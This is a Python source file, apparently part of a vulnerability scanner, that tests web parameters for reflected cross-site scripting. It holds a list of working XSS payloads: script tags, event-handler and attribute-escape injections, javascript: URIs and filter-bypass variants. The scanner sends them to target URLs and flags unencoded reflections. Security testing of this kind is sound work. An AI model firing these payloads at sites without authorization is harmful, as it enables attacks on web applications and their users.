"""XSS漏洞检测引擎"""
import re
import urllib.parse
from dataclasses import dataclass

import requests


@dataclass
class XSSVulnerability:
    url: str
    param: str
    method: str
    technique: str  # reflected, dom
    payload: str
    evidence: str
    severity: str = "medium"

    def to_dict(self):
        return {
            "url": self.url,
            "param": self.param,
            "method": self.method,
            "technique": self.technique,
            "payload": self.payload,
            "evidence": self.evidence,
            "severity": self.severity,
            "type": "XSS",
        }


class XSSScanner:
    """XSS漏洞扫描器"""

    def __init__(self, timeout: int = 10, delay: float = 0):
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })

    # ── Payloads ──────────────────────────────────────────────

    @staticmethod
    def _reflected_payloads():
        """反射型XSS payload列表"""
        return [
            # 基础script标签
            '<script>alert(1)</script>',
            '<script>alert("XSS")</script>',
            '<script>prompt(1)</script>',
            '<script>confirm(1)</script>',

            # 事件处理器
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<iframe src="javascript:alert(1)">',

            # 伪协议
            '<a href="javascript:alert(1)">XSS</a>',
            '<a href="data:text/html,<script>alert(1)</script>">XSS</a>',

            # 属性逃逸
            '" onmouseover="alert(1)"',
            "' onmouseover='alert(1)'",
            '" onfocus="alert(1)" autofocus="',
            "' onfocus='alert(1)' autofocus='",

            # 编码绕过
            '"><script>alert(1)</script>',
            "';alert(1)//",
            '"><img src=x onerror=alert(1)>',
            '</title><script>alert(1)</script>',
            '</textarea><script>alert(1)</script>',

            # 大小写混合
            '<ScRiPt>alert(1)</ScRiPt>',
            '<IMG SRC=x OnErRoR=alert(1)>',
            '<sVg OnLoAd=alert(1)>',

            # 不带括号
            '<script>alert`1`</script>',
            '<script>alert&#40;1&#41;</script>',

            # CSS
            '<div style="background:url(javascript:alert(1))">',
            '<div style="width:expression(alert(1))">',
        ]

    @staticmethod
    def _detect_marker():
        """唯一标记，用于检测payload是否被反射"""
        return "xss12345"

    # ── 检测方法 ──────────────────────────────────────────────

    def _make_request(self, url, method, param, value, data=None):
        """发送请求"""
        try:
            if method.upper() == "GET":
                params = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query))
                params[param] = value
                base = urllib.parse.urlsplit(url)._replace(query="").geturl()
                resp = self.session.get(
                    base, params=params, timeout=self.timeout, allow_redirects=True
                )
            else:
                post_data = dict(data) if data else {}
                post_data[param] = value
                resp = self.session.post(
                    url, data=post_data, timeout=self.timeout, allow_redirects=True
                )
            return resp
        except requests.RequestException:
            return None

    def _is_reflected(self, response_text, payload):
        """检查payload是否被原样反射（未编码）"""
        if payload in response_text:
            return True
        return False

    def _is_encoded(self, response_text, payload):
        """检查payload是否被安全编码"""
        # 常见的安全编码方式
        encoded_variants = [
            payload.replace("<", "&lt;").replace(">", "&gt;"),
            payload.replace("<", "&#60;").replace(">", "&#62;"),
            payload.replace('"', "&quot;").replace("'", "&#39;"),
            urllib.parse.quote(payload),
            payload.replace("<", "\\x3c").replace(">", "\\x3e"),
        ]
        for encoded in encoded_variants:
            if encoded in response_text and payload not in response_text:
                return True
        return False

    def scan_param(self, url, param, method="GET", data=None):
        """对单个参数进行XSS检测"""
        vulnerabilities = []

        # 1) 先检测参数值是否被反射
        marker = self._detect_marker()
        resp = self._make_request(url, method, param, marker, data)
        if resp is None:
            return vulnerabilities

        if marker not in resp.text:
            # 参数值未被反射，跳过XSS检测
            return vulnerabilities

        # 2) 注入XSS payload
        for payload in self._reflected_payloads():
            resp = self._make_request(url, method, param, payload, data)
            if resp is None:
                continue

            if self._is_reflected(resp.text, payload):
                # payload被原样反射，存在XSS漏洞
                # 找到反射位置作为证据
                idx = resp.text.find(payload)
                context = resp.text[max(0, idx - 50):idx + len(payload) + 50]
                return [XSSVulnerability(
                    url=url, param=param, method=method,
                    technique="reflected", payload=payload,
                    evidence=f"Payload被原样反射: ...{context}...",
                    severity="medium"
                )]

            import time
            if self.delay:
                time.sleep(self.delay)

        return vulnerabilities
